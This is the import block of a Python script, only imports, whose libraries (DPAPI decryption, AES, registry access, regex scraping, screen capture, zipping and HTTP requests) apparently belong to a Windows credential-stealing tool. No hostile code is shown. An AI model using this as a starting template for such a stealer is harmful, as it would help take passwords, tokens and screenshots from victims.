import requests
import os
import subprocess
import platform
import winreg as reg
import random
import string
import winreg
import shutil
import json
import zipfile

from modules.figgy              import n0x
from datetime           import datetime
from base64             import b64decode
from Crypto.Cipher      import AES
from win32crypt         import CryptUnprotectData
from os                 import getlogin, listdir, getenv
from json               import loads
from re                 import findall
from urllib.request     import Request, urlopen
from subprocess         import Popen, PIPE
from PIL                import ImageGrab